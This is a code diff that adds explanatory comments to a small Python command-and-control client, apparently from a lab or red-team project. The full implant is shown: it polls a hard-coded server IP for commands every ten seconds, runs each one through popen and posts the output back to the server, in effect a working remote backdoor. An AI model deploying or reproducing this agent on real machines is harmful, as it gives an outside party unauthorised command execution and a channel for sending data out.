@@ -3,8 +3,10 @@ import requests
 import time
 import os
 
+# change to server IP
 SERVER_URL = "http://100.64.4.223:5000"
 
+# Grabs command from http endpoint
 def get_command():
     try:
         response = requests.get(f"{SERVER_URL}/command")
@@ -14,6 +16,7 @@ def get_command():
         #print(f"Error fetching command: {e}")
         return ""
 
+# Send result data to http endpoint
 def send_result(result):
     try:
         response = requests.post(f"{SERVER_URL}/result", json={'result': result})
@@ -22,6 +25,7 @@ def send_result(result):
         #print(f"Error sending result: {e}")
         pass
 
+# uses popen to execute the command sent from c2server
 def execute_command(command):
     if command == "":
         return "No command received."
@@ -33,6 +37,7 @@ def execute_command(command):
     except Exception as e:
         return f"Error executing command: {e}"
 
+# Checks the endpoint every 10 seconds to grab new command(s)
 if __name__ == "__main__":
     while True:
         command = get_command()
@@ -41,4 +46,4 @@ if __name__ == "__main__":
             result = execute_command(command)
             #print(f"Command result: {result}")
             send_result(result)
-        time.sleep(10)  # Check every 10 seconds
+        time.sleep(10) 
